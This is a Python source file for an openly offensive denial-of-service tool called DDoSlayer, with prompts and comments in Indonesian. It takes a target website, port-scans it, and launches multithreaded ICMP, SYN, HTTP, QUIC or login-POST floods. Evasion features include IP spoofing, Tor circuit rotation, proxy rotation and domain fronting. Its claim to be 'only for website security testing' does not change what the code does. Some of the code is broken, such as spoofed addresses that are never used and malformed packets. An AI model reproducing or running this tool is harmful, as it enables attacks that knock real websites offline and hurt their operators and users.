#!/usr/bin/env python3
# Penulis: ILYASPUTRARAMADHAN
import os
import sys
import socket
import random
import time
import threading
import ipaddress
import struct
import ssl
import hashlib
import base64
from argparse import ArgumentParser
from termcolor import colored
from cryptography.fernet import Fernet
import requests
from stem import Signal
from stem.control import Controller
from scapy.all import sr, sr1, IP, TCP

MAX_THREADS = 9000
BUFFER_SIZE = 65535
STEALTH_MODE = True
HYBRID_ATTACK = True

os.system("clear")
os.system("figlet -f slant 'DDoSlayer'")

BANNER = colored(f"""
╔═╗╔╦╗╔═╗╦  ╔═╗╔═╗╦  ╦    ╔═╗
╚═╗ ║ ╠═╝║  ║ ║║ ║║  ║    ║ ╦
╚═╝ ╩ ╩  ╩═╝╚═╝╚═╝╩═╝╩═╝  ╚═╝
{colored('Versi 8.0 | QUANTUM', 'yellow')}
{colored('{[WELCOME TO IS PROGRAM DDOSLAYER]}', 'blue')}
{colored('{[AUTHOR : ZORKYT]}', 'green')}
{colored('{[This tool is only for website security testing. Use this tool wisely and do not misuse this tool.]}', 'red')}
""", 'cyan')

print(BANNER)

class PhantomTrafficGenerator:
    def __init__(self):
        self.fernet = Fernet.generate_key()
        self.proxy_list = self._load_proxies()
        self.current_proxy = 0
        self.domain_front = [
            'cdn.cloudflare.com',
            'api.fastly.com',
            'aws.amazon.com'
        ]
        self.protocol_templates = {
            'http2': self._create_http2_stream,
            'quic': self._create_quic_datagram,
            'dns': self._create_dns_query
        }
    
    def _load_proxies(self):
        try:
            with open('proxies.txt', 'r') as f:
                return [line.strip() for line in f]
        except:
            return []
    
    def _create_http2_stream(self):
        return base64.b64encode(hashlib.sha3_256(str(time.time()).encode()).digest())
    
    def _create_quic_datagram(self):
        return struct.pack('!I', random.randint(1, 0xFFFFFFFF)) + random._urandom(512)
    
    def _create_dns_query(self):
        domain = f"{hashlib.blake2s(str(time.time()).encode()).hexdigest()[:8]}.net"
        return struct.pack('!H', random.randint(1, 0xFFFF)) + domain.encode()

class GhostDDoSEngine:
    def __init__(self):
        self.attack_active = True
        self.phantom = PhantomTrafficGenerator()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Android 13; Mobile; rv:108.0) Gecko/108.0 Firefox/108.0',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/15.0 Mobile/15A372 Safari/604.1'
        ]
        self.anti_detect = {
            'ttl': random.randint(32, 255),
            'window_size': random.randint(1024, 65535),
            'mac': self._spoof_mac()
        }
    
    def _spoof_mac(self):
        vendors = ['00:0c:29', '00:50:56', '00:1c:42', '00:25:b3']
        return f"{random.choice(vendors)}:{random.randint(0x00,0xff):02x}:" \
               f"{random.randint(0x00,0xff):02x}:" \
               f"{random.randint(0x00,0xff):02x}"
    
    def _spoof_ip(self):
        if random.choice([True, False]):
            return str(ipaddress.IPv4Address(random.randint(0x0B000000, 0xDF000000)))
        else:
            return str(ipaddress.IPv6Address(random.getrandbits(128)))
    
    def _domain_fronting(self, sock, target):
        front_domain = random.choice(self.phantom.domain_front)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        wrapped_sock = context.wrap_socket(sock, server_hostname=front_domain)
        wrapped_sock.connect((front_domain, 443))
        wrapped_sock.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
    
    def _encrypt_payload(self, data):
        cipher = Fernet(self.phantom.fernet)
        return cipher.encrypt(data)
    
    def _fragment_packet(self, data):
        return [data[i:i+random.randint(128,512)] for i in range(0, len(data), random.randint(128,512))]

    def _use_tor(self):
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password="your_password")  # Set your control password
            controller.signal(Signal.NEWNYM)
            time.sleep(controller.get_newnym_wait())

class ShadowStrike(GhostDDoSEngine):
    def __init__(self):
        super().__init__()
        self.attack_vectors = {
            'layer3': self.layer3_icmp_flood,
            'layer4': self.layer4_syn_flood,
            'layer7': self.layer7_http_flood,
            'quic': self.layer7_quic_flood,  # Adding QUIC attack vector
            'bypass': self.bypass_attack  # Adding bypass attack vector
        }
    
    def _start_attack(self, attack_func, attack_name, target, port=None, threads=500):
        if threads > MAX_THREADS:
            print(colored(f"[!] Thread limit exceeded ({MAX_THREADS})", 'red'))
            return

        def attack_wrapper():
            while self.attack_active:
                try:
                    attack_func(target, port) if port else attack_func(target)
                except Exception as e:
                    if not STEALTH_MODE:
                        print(colored(f"[!] Error: {str(e)}", 'yellow'))

        for _ in range(threads):
            t = threading.Thread(target=attack_wrapper)
            t.daemon = True
            t.start()
        
        print(colored(f"\n[+] Launching {attack_name} attack on {target}...", 'green'))
        try:
            while self.attack_active:
                time.sleep(1)
        except KeyboardInterrupt:
            self.attack_active = False
            print(colored("\n[!] Attack terminated by user", 'red'))

    def layer3_icmp_flood(self, target, threads=1000):
        def icmp_attack(dst_ip):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                while self.attack_active:
                    packet = self._create_icmp_packet()
                    sock.sendto(packet, (dst_ip, 0))
            except PermissionError:
                print(colored("\n[!] Root access required!", 'red'))
                sys.exit(1)

        self._start_attack(icmp_attack, "ICMP Flood", target, threads=threads)

    def layer4_syn_flood(self, target, port, threads=1500):
        def syn_attack(dst_ip, dst_port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                while self.attack_active:
                    src_ip = self._spoof_ip()
                    packet = self._create_tcp_packet(src_ip, dst_ip, dst_port)
                    sock.sendto(packet, (dst_ip, 0))
            except PermissionError:
                print(colored("\n[!] Root access required!", 'red'))
                sys.exit(1)

        self._start_attack(syn_attack, "SYN Flood", target, port, threads)

    def layer7_http_flood(self, target, port, threads=2000):
        def http_attack(dst_ip, dst_port):
            while self.attack_active:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    if self.phantom.proxy_list:
                        proxy = random.choice(self.phantom.proxy_list)
                        sock.connect((proxy.split(':')[0], int(proxy.split(':')[1])))
                    else:
                        sock.connect((dst_ip, dst_port))
                    
                    encrypted_payload = self._encrypt_payload(
                        f"GET / HTTP/1.1\r\nHost: {dst_ip}\r\nUser-Agent: {random.choice(self.user_agents)}\r\n\r\n".encode()
                    )
                    
                    for fragment in self._fragment_packet(encrypted_payload):
                        sock.send(fragment)
                        time.sleep(random.uniform(0.1, 0.5))
                except:
                    pass
                finally:
                    sock.close()

        self._start_attack(http_attack, "HTTP Flood", target, port, threads)

    def layer7_quic_flood(self, target, port, threads=2000):
        def quic_attack(dst_ip, dst_port):
            while self.attack_active:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(5)
                    
                    if self.phantom.proxy_list:
                        proxy = random.choice(self.phantom.proxy_list)
                        sock.connect((proxy.split(':')[0], int(proxy.split(':')[1])))
                    else:
                        sock.connect((dst_ip, dst_port))
                    
                    datagram = self.phantom._create_quic_datagram()
                    
                    for fragment in self._fragment_packet(datagram):
                        sock.send(fragment)
                        time.sleep(random.uniform(0.1, 0.5))
                except:
                    pass
                finally:
                    sock.close()

        self._start_attack(quic_attack, "QUIC Flood", target, port, threads)
    
    def bypass_attack(self, target, port, threads=2000):
        # Implementing a bypass attack method
        def bypass(dst_ip, dst_port):
            while self.attack_active:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    if self.phantom.proxy_list:
                        proxy = random.choice(self.phantom.proxy_list)
                        sock.connect((proxy.split(':')[0], int(proxy.split(':')[1])))
                    else:
                        sock.connect((dst_ip, dst_port))
                    
                    payload = self._encrypt_payload(
                        f"POST /login HTTP/1.1\r\nHost: {dst_ip}\r\nUser-Agent: {random.choice(self.user_agents)}\r\nContent-Length: 1000\r\n\r\n".encode()
                    )
                    
                    for fragment in self._fragment_packet(payload):
                        sock.send(fragment)
                        time.sleep(random.uniform(0.1, 0.5))
                except:
                    pass
                finally:
                    sock.close()

        self._start_attack(bypass, "Bypass Attack", target, port, threads)
    
    def _create_icmp_packet(self):
        icmp_type = 8
        icmp_code = 0
        icmp_id = random.randint(0, 0xFFFF)
        icmp_seq = random.randint(0, 0xFFFF)
        payload = random._urandom(random.randint(64, 512))
        
        header = struct.pack('!BBHHH', icmp_type, icmp_code, 0, icmp_id, icmp_seq)
        checksum = self._calculate_checksum(header + payload)
        
        return struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq) + payload

    def _create_tcp_packet(self, src_ip, dst_ip, dst_port):
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 0xFFFFFFFF)
        ack_num = 0
        window = self.anti_detect['window_size']
        
        tcp_header = struct.pack('!HHLLHHHH', 
            src_port, dst_port, seq_num, ack_num,
            (5 << 12) | 0 , window, 0, 0)
        
        return tcp_header + b'\x00' * 16  

    def _calculate_checksum(self, source_string):
        sum = 0
        for i in range(0, len(source_string), 2):
            if i + 1 < len(source_string):
                sum += (source_string[i] << 8) + (source_string[i + 1])
            else:
                sum += (source_string[i] << 8)
        sum = (sum >> 16) + (sum & 0xFFFF)
        sum += (sum >> 16)
        return ~sum & 0xFFFF

def get_target_info(url):
    try:
        response = requests.get(f"https://api.hackertarget.com/dnslookup/?q={url}")
        data = response.text.split('\n')
        ip_addresses = [line.split(',')[1] for line in data if 'A' in line]
        return ip_addresses[0] if ip_addresses else None
    except:
        return None

def scan_ports(target_ip):
    open_ports = []
    common_ports = [80, 443, 21, 22, 23, 25, 53, 110, 143, 445, 3389]

    for port in common_ports:
        pkt = sr1(IP(dst=target_ip)/TCP(dport=port, flags="S"), timeout=0.5, verbose=0)
        if pkt and pkt.haslayer(TCP) and pkt[TCP].flags == 0x12:
            open_ports.append(port)
            sr(IP(dst=target_ip)/TCP(dport=port, flags="R"), timeout=0.5, verbose=0)
    
    return open_ports

def main():
    while True:
        target_url = input("Masukkan URL website target: ")
        target_ip = get_target_info(target_url)
        
        if not target_ip:
            print(colored("[!] Tidak dapat mengambil alamat IP target", 'red'))
            continue
        
        print(f"IP Address: {target_ip}")
        open_ports = scan_ports(target_ip)
        print(f"Port aktif: {', '.join(map(str, open_ports))}\n")

        print("Pilih metode serangan:")
        print("1. Layer3 (ICMP Flood)")
        print("2. Layer4 (SYN Flood)")
        print("3. Layer7 (HTTP Flood)")
        print("4. QUIC Flood")
        print("5. Bypass Attack")
        attack_choice = input("Masukkan pilihan (1-5): ")

        if attack_choice not in ['1', '2', '3', '4', '5']:
            print(colored("[!] Pilihan tidak valid", 'red'))
            continue
        
        threads = input("Masukkan jumlah threads (default 7000, max 9000): ")
        try:
            threads = int(threads)
            if threads > MAX_THREADS:
                print(colored(f"[!] Thread limit exceeded ({MAX_THREADS})", 'red'))
                continue
        except ValueError:
            threads = 7000
        
        print("\nPilih metode penyamaran:")
        print("1. Tidak ada")
        print("2. IP Spoofing")
        print("3. Tor")
        anonymization_choice = input("Masukkan pilihan (1-3): ")

        tool = ShadowStrike()

        if anonymization_choice == '2':
            tool._spoof_ip()
        elif anonymization_choice == '3':
            tool._use_tor()

        if attack_choice == '1':
            tool.layer3_icmp_flood(target_ip, threads)
        elif attack_choice == '2':
            tool.layer4_syn_flood(target_ip, open_ports[0], threads)
        elif attack_choice == '3':
            tool.layer7_http_flood(target_ip, open_ports[0], threads)
        elif attack_choice == '4':
            tool.layer7_quic_flood(target_ip, open_ports[0], threads)
        elif attack_choice == '5':
            tool.bypass_attack(target_ip, open_ports[0], threads)
        else:
            print(colored("Pilihan serangan tidak valid.", 'red'))
            continue

if __name__ == "__main__":
    main()